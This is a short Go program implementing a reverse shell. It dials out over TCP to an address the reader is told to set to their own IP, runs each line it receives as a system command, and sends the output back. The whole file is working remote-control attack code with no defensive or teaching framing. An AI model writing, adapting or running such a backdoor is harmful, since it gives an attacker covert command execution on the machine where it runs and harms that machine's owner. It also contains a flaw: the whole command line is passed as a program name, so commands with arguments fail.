package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
)

func main() {
	// Change this to your computer's IP address and the port you want to listen on
	address := "127.0.0.1:8888"

	// Connect to the listener
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	// Start reading commands from the connection
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := scanner.Text()

		fmt.Println("Command:", command)
		// Execute the command
		output, err := exec.Command(command).Output()
		if err != nil {
			fmt.Fprintln(conn, "Error executing command:", err)
			continue
		}

		// Send the output of the command back to the listener
		fmt.Fprintln(conn, string(output))
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading:", err)
	}
}
